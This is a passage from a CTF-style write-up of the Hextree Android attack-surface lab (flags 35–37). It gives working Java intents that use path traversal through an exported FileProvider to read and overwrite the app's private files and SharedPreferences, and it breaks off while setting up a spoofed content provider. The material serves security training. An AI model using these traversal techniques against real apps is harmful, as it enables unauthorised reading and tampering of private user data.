</span></span></span></code></pre></div><p>Activity that handles file sharing via a FileProvider as it first checks if an intent extra named &ldquo;filename&rdquo; was provided If yes, it calls <code>prepareFlag()</code> with that filename, creates a URI for the file using FileProvider, creates an intent with this URI, sets some flags, and returns a result code of 0 (success).</p><p>The <code>prepareFlag()</code> method checks if the filename is &ldquo;flag35.txt&rdquo; and if the file exists. If so, it logs some tags and writes a flag to the file.</p><p>If no filename was provided (stringExtra is null) It defaults to using &ldquo;secret.txt&rdquo;, creates a URI for this file, creates an intent with this URI, sets some flags, and returns a result code of -1 (indicating failure or default case).</p><p>Since the activity is exported we can send an intent and here it looks for a <code>filename</code> and then prepares the flag in file <code>flag35.txt</code></p><h4 class="relative group">Solution<div id=solution-6 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-6 aria-label=Anchor>#</a></span></h4><p>lets see the uri that will be used to access <code>secret.txt</code>
<code>URI: content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/secret.txt</code></p><p>lets try request with <code>intent.putExtra("filename","flag35.txt");</code>
<code>URI: content://io.hextree.root/root_files/data/data/io.hextree.attacksurface/files/flag35.txt</code></p><p>we are looking inside folder <code>files</code> ? so to get around that we do as we normally do in any terminal, we take a step back using <code>..</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>intent</span><span class=p>.</span><span class=na>putExtra</span><span class=p>(</span><span class=s>&#34;filename&#34;</span><span class=p>,</span><span class=s>&#34;../flag35.txt&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>//you want secret so dont use it  </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>intent</span><span class=p>.</span><span class=na>setComponent</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ComponentName</span><span class=p>(</span><span class=s>&#34;io.hextree.attacksurface&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.attacksurface.activities.Flag35Activity&#34;</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=n>startActivityForResult</span><span class=p>(</span><span class=n>intent</span><span class=p>,</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>requestCode</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;Hextree&#34;</span><span class=p>,</span><span class=s>&#34;URI: &#34;</span><span class=o>+</span><span class=w> </span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>().</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=n>InputStream</span><span class=w> </span><span class=n>inputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>openInputStream</span><span class=p>(</span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>inputStream</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=w> </span><span class=p>;</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	            </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;File&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;[*]&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>line</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>FileNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>Then press done and see the magic</p><p><figure><img class="my-0 rounded-md" loading=lazy decoding=async fetchpriority=low alt=alt srcset="/superBLog/posts/ctf/mobile/hex/hex_provider/flag35_hu_1a2e3c0e5b5213b8.png 330w,
/superBLog/posts/ctf/mobile/hex/hex_provider/flag35_hu_991e48a18b127d11.png 660w,
/superBLog/posts/ctf/mobile/hex/hex_provider/flag35_hu_d15f5229d0a203e9.png 1280w" data-zoom-src=/superBLog/posts/ctf/mobile/hex/hex_provider/flag35.png src=/superBLog/posts/ctf/mobile/hex/hex_provider/flag35.png></figure></p><h3 class="relative group">Flag 36<div id=flag-36 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-36 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-7 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-7 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>Flag36Preferences</span><span class=p>.</span><span class=na>getBoolean</span><span class=p>(</span><span class=s>&#34;solved&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=n>Flag36Preferences</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>success</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;Flag36&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Not solved yet: \&#34;solved=false\&#34; in the `Flag36Preferences` shared preferences&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>if the shared preferences named <code>Flag36Preferences</code> and if it has value named <code>solved</code> set to <code>true</code> we get our flag but what is this shared preference ?</p><blockquote><p>[!info] A <code>SharedPreferences</code> is an object points to a file containing key-value pairs and provides simple methods to read and write them. Each <code>SharedPreferences</code> file is managed by the framework and can be private or shared. It&rsquo;s saved in xml format</p></blockquote><p>&mldr; now what ?</p><h4 class="relative group">Solution<div id=solution-7 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-7 aria-label=Anchor>#</a></span></h4><p>In flag35 we don&rsquo;t only have read permission but also the write , and since this provider uses root address we can go to where this shared preference is and open and edit file then we need to close the app and open it so that the changes take effect</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>intent</span><span class=p>.</span><span class=na>putExtra</span><span class=p>(</span><span class=s>&#34;filename&#34;</span><span class=p>,</span><span class=s>&#34;../shared_prefs/Flag36Preferences.xml&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>//you want secret so dont use it  </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>intent</span><span class=p>.</span><span class=na>setComponent</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ComponentName</span><span class=p>(</span><span class=s>&#34;io.hextree.attacksurface&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.attacksurface.activities.Flag35Activity&#34;</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>startActivityForResult</span><span class=p>(</span><span class=n>intent</span><span class=p>,</span><span class=n>2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>requestCode</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>2</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;Hextree&#34;</span><span class=p>,</span><span class=s>&#34;URI: &#34;</span><span class=o>+</span><span class=w> </span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>().</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>inputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>openInputStream</span><span class=p>(</span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>stringBuilder</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>inputStream</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;File&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;[*]&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>line</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>line</span><span class=p>.</span><span class=na>contains</span><span class=p>(</span><span class=s>&#34;false&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;File&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;[*] /* new rules buddy *\\&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>line</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=s>&#34;false&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;true&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;File&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;[*]&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>line</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>stringBuilder</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>line</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;\n&#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>reader</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Write the modified content back to the file  </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>OutputStream</span><span class=w> </span><span class=n>outputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>openOutputStream</span><span class=p>(</span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>stringBuilder</span><span class=p>.</span><span class=na>toString</span><span class=p>().</span><span class=na>getBytes</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>outputStream</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>FileNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h3 class="relative group">Flag 37<div id=flag-37 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-37 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-8 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-8 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w> </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>Bundle</span><span class=w> </span><span class=n>bundle</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>super</span><span class=p>.</span><span class=na>onCreate</span><span class=p>(</span><span class=n>bundle</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LogHelper</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Uri</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getIntent</span><span class=p>().</span><span class=na>getData</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>data</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>query</span><span class=p>(</span><span class=n>data</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=o>!</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToFirst</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Extract file metadata</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>fileName</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnIndex</span><span class=p>(</span><span class=s>&#34;_display_name&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>long</span><span class=w> </span><span class=n>fileSize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getLong</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnIndex</span><span class=p>(</span><span class=s>&#34;_size&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=n>fileSize</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=n>fileName</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Check if it&#39;s the correct flag file</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=s>&#34;../flag37.txt&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>fileName</span><span class=p>)</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>fileSize</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>1337</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;Flag37&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;File name &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>fileName</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; or size &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>fileSize</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; doesn&#39;t match&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read file content</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>(</span><span class=n>InputStream</span><span class=w> </span><span class=n>inputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>openInputStream</span><span class=p>(</span><span class=n>data</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>             </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>inputStream</span><span class=p>)))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>fileContent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>fileContent</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>line</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>this</span><span class=p>.</span><span class=na>f</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=n>fileContent</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=s>&#34;give flag&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>fileContent</span><span class=p>.</span><span class=na>toString</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>success</span><span class=p>(</span><span class=k>this</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Log</span><span class=p>.</span><span class=na>i</span><span class=p>(</span><span class=s>&#34;Flag37&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;File content &#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>fileContent</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39; is not &#39;give flag&#39;&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>e</span><span class=p>(</span><span class=s>&#34;Flag37&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;Error processing file&#34;</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>Here the activity gets an intent and takes the URI in it and use it to call a provider, then Checks if the file is named &ldquo;../flag37.txt&rdquo; and exactly 1337 bytes in size if true it opens an input stream to read the file and Reads the entire file content into a <code>StringBuilder</code> then Checks if the content is exactly <code>"give flag"</code> If it matches, calls a <code>success()</code> method (likely showing success) and If not, logs that the content doesn&rsquo;t match</p><h4 class="relative group">Solution<div id=solution-8 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-8 aria-label=Anchor>#</a></span></h4><p>Here we need to create your content provider with the requirement then clicking the flag&rsquo;s activity from app</p><p>The Flag 37 activity performs these specific checks:</p><ol><li><strong>Queries a content provider</strong> via the URI from the intent</li><li><strong>Extracts metadata</strong> from the cursor: <code>_display_name</code> and <code>_size</code> columns</li><li><strong>Validates the filename</strong> must be exactly <code>"../flag37.txt"</code></li><li><strong>Validates the file size</strong> must be exactly <code>1337</code> bytes</li><li><strong>Reads the file content</strong> using <code>openInputStream()</code></li><li><strong>Checks if content equals</strong> exactly <code>"give flag"</code></li></ol><p>The <strong>custom content provider</strong> that will:</p><ul><li>Returns the correct metadata in the <code>query()</code> method</li><li>Provides the exact file content via <code>openInputStream()</code> or <code>openFile()</code></li><li>Ensures the content is exactly 1337 bytes (with padding)</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;provider</span>  
